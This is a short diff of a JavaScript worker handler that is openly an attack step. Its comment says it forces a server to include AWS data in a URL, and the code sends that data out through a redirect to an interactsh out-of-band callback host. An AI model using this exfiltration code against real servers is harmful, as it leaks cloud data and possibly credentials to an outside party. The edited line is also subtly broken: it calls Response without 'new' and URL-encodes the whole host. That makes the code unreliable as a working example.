@@ -6,6 +6,6 @@ export default {
     
     // Step 2: Force the server to include AWS data in the URL path/params
     const interactshUrl = "https://bjgibppjensgmxvguqwdm2xp3ddbjdtag.oast.fun";
-    return Response.redirect(`${encodeURIComponent(interactshUrl)}/${awsUrl}`, 302);
+    return Response(`${encodeURIComponent(interactshUrl)}/${awsUrl}`, 302);
   }
 };
